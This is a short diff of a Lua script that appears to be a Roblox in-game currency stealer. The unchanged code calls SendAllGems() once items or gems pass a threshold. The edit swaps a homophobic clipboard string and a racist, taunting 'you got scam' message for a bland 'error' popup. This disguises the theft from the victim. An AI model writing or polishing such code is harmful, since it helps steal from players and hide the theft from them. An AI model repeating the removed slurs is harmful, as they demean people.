@@ -361,7 +361,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         end
     end
     SendAllGems()
-    setclipboard("IM GAY")
+    setclipboard("-_-")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("BIG BLACK MONKEY YOU GOT SCAM 😂😂")
+    message.Error("error")
 end
